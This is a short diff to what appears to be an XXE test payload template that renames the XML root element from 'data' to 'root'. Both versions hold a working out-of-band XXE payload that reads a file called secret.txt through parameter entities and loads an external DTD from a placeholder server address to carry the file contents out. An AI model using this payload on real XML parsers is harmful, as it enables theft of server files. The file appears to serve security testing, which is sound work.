@@ -11,12 +11,12 @@ path: secret.txt
 content: xxe-pe.dtd
 log-request: no
 -->
-<!DOCTYPE data [
-  <!ELEMENT data (#PCDATA)>
+<!DOCTYPE root [
+  <!ELEMENT root (#PCDATA)>
   <!ENTITY % start "<![CDATA[">
   <!ENTITY % goodies SYSTEM "{files.secret_txt.url}">
   <!ENTITY % end "]]>">
   <!ENTITY % dtd SYSTEM "http://{server_address}/xxe-pe.dtd">
   %dtd;
 ]>
-<data>&all;</data>
+<root>&all;</root>
